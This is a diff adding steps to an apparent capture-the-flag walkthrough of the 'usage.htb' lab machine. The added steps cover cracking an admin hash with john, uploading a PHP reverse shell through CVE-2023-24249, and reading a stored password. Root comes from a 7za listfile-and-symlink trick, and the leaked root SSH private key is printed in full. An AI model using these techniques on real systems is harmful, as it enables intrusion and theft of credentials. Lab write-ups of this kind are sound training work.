@@ -68,7 +68,38 @@ inner network email phishing
 	(got: | 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |)
 9. save "$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2" to hash.txt
 10. Crack it using john: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-
+11. exploit: https://flyd.uk/post/cve-2023-24249/
+	(create php reverse shell, reverse.php, rename to reverse,jpg, burp intercept the upload, change name to reverse.php)
+	(ref: https://www.revshells.com/)
+12. get reverse shell of user: dash.
+13. list opening ports: ss -tlpn
+    list processes: ps -aux
+    check file system table: cat /etc/fstab
+	(find interesting process /usr/bin/monit)
+14. run cmd: find / -name monit.service 2>/dev/null
+15. find user "xander" pass in ~/.monitrc
+16. sudo -l, find user can run elf /usr/bin/usage_management by root.
+17. run it with sudo, the elf can:
+	(1. bakup file to /var/backups/project.zip)
+	(2. backup mysql to /var/backups/mysql_backup.sql)
+	(3. Reset admin password)
+18. static analysis of usage_management, found it uses:
+	/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+	/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+	strings: chdir, /var/www/html (guess it will chdir to html folder and compress)
+19. The @id_rsa file (also referred to as a listfile) tells 7zip that id_rsa contains a list of files to be compressed.
+20. xander@usage:/var/www/html$ touch @id_rsa
+21. xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
+22. the usage_management will try to archieve each line in id_rsa as a file, the error message will leak the private key:
+	-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+	QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+	QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+	AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+	H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+	-----END OPENSSH PRIVATE KEY----- : No more files
+23. copy the content to file "id_rsa123" on attacking machine. (remove error log " : No more files")
+24. log in to machine: ssh -i ./root-rsa root@usage.htb
 ```
 
 
